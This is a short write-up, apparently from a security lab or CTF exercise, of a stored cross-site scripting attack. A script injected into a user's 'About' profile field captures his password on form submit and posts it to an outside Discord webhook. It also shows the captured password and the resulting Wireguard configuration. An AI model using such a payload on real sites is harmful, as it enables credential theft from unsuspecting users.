# Attack 3

## Background

This third attack was performed to gain access to the user Jonas Dahl's Wireguard credentials.

This attack was possible due to a field in his user info called "About" where it was possible to input custom data. Executable javascripts were also allowed.

It was already known that Jonas Dahl frequently logged in to check his Wireguard credentials by inputting his password in the authentication field on this page.

## Solution

By reading the page source I discovered the *authPassword* element submitted by the form to retrieve the Wireguard credentials. I then added a custom script in the "About" section for Jonas Dahl that retrieved the *authPassword* element in the form and sent it to a Discord webhook I created. The script is shown below:

```js
<script>
    document.addEventListener("DOMContentLoaded", () => {
        document.getElementById("authForm").addEventListener("submit", (event) => {
            event.preventDefault(); // Prevent the form from submitting normally
            const password = document.getElementById("authPassword").value;
            fetch("<WEBHOOK URL>", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `Password: ${password}`
                })
            })
        });
    });
</script>
```

The result was a success and I gathered his password: `jeg!Har%Mest&LystTil&At%Være-En-Hacker`

This gave me his Wireguard configuration which I used for the next attack:
```ini
[Interface]
Address = 10.13.13.5
PrivateKey = <redacted>
ListenPort = 51820
DNS = 10.13.13.1

[Peer]
PublicKey = Yg6iNtA7+F6AWfnuqCzJPx2cdHKcYOXSvz0LNx4sMjs=
PresharedKey = <redacted>
Endpoint = 64.225.76.73:51820
AllowedIPs = 10.13.13.0/24
```